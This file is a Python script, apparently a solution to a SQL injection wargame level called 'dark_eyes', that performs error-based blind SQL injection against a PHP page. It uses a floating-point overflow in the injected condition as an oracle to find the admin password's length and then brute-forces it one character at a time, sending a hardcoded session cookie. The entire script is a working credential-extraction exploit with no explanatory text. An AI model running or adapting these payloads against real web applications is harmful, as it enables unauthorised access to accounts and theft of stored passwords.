import urllib.request
from urllib.parse import quote

key = ""
i=1
pwlen = 0

while i :
    url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
    data = "' or id='admin' and (((length(pw)='{}')+1)*9e307)#".format(str(i))
    print(data)
    
    data = quote(data)
    re = urllib.request.Request(url + data)
    re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
    re.add_header("Cookie", "PHPSESSID=nk6mlf5lc0jfv3np07uda7tcj4")

    response = urllib.request.urlopen(re)

    if str(response.read()).find("php") == -1:
        pwlen = i
        print('pw length : ' + str(pwlen))
        break   
    i+=1    

for i in range(1, pwlen + 1):
    for j in range(32, 127):
        if chr(j) in ('_', '.',"'"):
            continue
        url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
        data = "' or id='admin' and (((substr(pw, 1, {})='{}')+1)*9e307) #".format(str(i), key + chr(j))
        print(data)

        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=nk6mlf5lc0jfv3np07uda7tcj4")

        req = urllib.request.urlopen(re)

        if str(req.read()).find("php") == -1:
            key += chr(j).lower()
            print(key)
            break
print(key)